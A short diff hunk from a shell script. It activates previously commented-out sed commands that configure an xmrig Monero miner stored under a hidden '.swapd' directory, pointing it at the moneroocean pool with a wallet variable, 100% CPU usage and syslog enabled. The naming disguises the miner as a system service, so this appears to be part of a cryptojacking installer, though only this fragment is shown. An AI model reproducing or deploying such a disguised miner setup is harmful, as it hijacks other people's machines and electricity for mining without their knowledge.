@@ -228,13 +228,13 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-# sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.swapd/config.json
-# sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
-# sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
-# sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
-# sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/xmrig.log'",#' $HOME/.swapd/config.json
-# sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
-# sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.swapd/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/xmrig.log'",#' $HOME/.swapd/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
+sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
 rm $HOME/.swapd/config.json
 
